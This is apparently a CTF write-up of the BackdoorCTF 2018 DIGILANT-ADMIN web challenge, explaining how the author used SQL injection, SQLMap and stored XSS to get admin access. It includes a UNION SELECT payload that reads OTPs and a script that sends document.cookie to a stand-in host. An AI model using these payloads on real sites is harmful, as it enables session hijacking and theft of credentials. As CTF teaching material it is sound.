---
layout: post
title: BackdoorCTF 2018 - DIGILANT-ADMIN
author:
  name: Crisis
  github: Qrisis
  twitter: crisiswic
---
Here's my solution for the DIGILANT-ADMIN challenge of the 2018 BackdoorCTF. I'm not sure wether I got the flag the intended way since there has been quite a few technical problems during the event, but here's how I did it anyway.

First of all, this was the challenge's description:  
![](https://i.imgur.com/vemjbMy.png)

Once on the website, you could create an account by providing an email adress, and then log in with the OTP sent to that email adress.   
![](https://i.imgur.com/Bch0ZOm.png)

Once logged in, the main thing you could do was to post a new message:  
![](https://i.imgur.com/qY08mZY.png)
And report messages to the admin :  
![](https://i.imgur.com/KOyK8oe.png)

The other interesting thing was the "Giveme flag" page, which stated:  
```
No admin No flag
```


So my first idea was of course to try and find an exploitable XSS to log in as admin. I tried a few things, but it wasn't executing on the URL where you could see your post:  
```
http://51.15.73.163/DIGILANT-ADMIN/posts.php?id=000af61e777d34ab
```  
So I tried a few other things, and I found that the id parameter was vulnerable to an SQL injection and to an XSS injection :  
![](https://i.imgur.com/2pIbQat.png)  
I tried to steal the admin cookie with that XSS, but the bot wasn't clicking on my link. And the results of the SQL injections were also confusing at first since I couldn't read them. After testing a few things, I found out why - the results were decrypted as base64 before being returned. So the easy fix was to base64 encode it, as such:  
![](https://i.imgur.com/zXCRAmp.png)  
Since I wasn't successfull with the XSS, I decided to try exploiting the SQLi to get the admin pass and OTP. With the help of SQLMap, I dumped the content of the database:  
![](https://i.imgur.com/87bPuIJ.png)  
  etc.  
![](https://i.imgur.com/TlhkZJE.png)  
etc.     
  
And in theory I could have been done since I could have just logged in as "admin" and got the OTP directly from the database:  
```sql
http://51.15.73.163/DIGILANT-ADMIN/posts.php?id=-1' UNION ALL SELECT to_base64(otp) FROM OTP WHERE umail='2d3686a381fa880ddab@gmail.com' -- - 
```
But the problem was that I had no way to know which user was the admin. As you can see on the screenshot above there was many "random hash" accounts, and none of the accounts with the name "admin" in them was the real one. After trying a few of them, I decided to find another way rather than stupidly trying them all.  
In the dump of the database, I noticed that many people had reported URLs like this:  
![](https://i.imgur.com/UQigMAO.png)  
That gave me a big hint. I had already noticed that HTML/JS was being executed on the homepage, and upon closer inspection of the code it turned out that there was a way to exploit an XSS in your posts:  
![](https://i.imgur.com/m3cyYe3.png)  
You just had to access your post's URL with `&full=true` appended to it:  
![](https://i.imgur.com/L8RjsKN.png)  

I made a new one with the standard 
```html
<script>location.replace('yoursite.com?cookie='+document.cookie)</script>
```
injection, and I got the admin's PHPSESSID on requestbin:  
![](https://i.imgur.com/6kwpoqS.png)  

I modified my cookie, but got kicked out:
```
Login attempted from another IP address. Login again
```  
Which was a problem since I still had no idea what the admin username was. But it turned out that if you tried logging in again with any account, you could briefly see the admin's name:  
![](https://i.imgur.com/gFq9PJw.png)  
I'm not sure wether this was intended or not. All I had to do then was to login with that username and get the OTP from the database, as shown before. But that wasn't even necessary, because if you entered a wrong OTP, the website would just show you the right one (here I just put "12" in):  
![](https://i.imgur.com/sBZPX8Z.png)  
Not sure if that was a bug or not either, but you could then just log in like that. And get the flag from the "Giveme flag" page :  
![](https://i.imgur.com/1jyENgf.png)  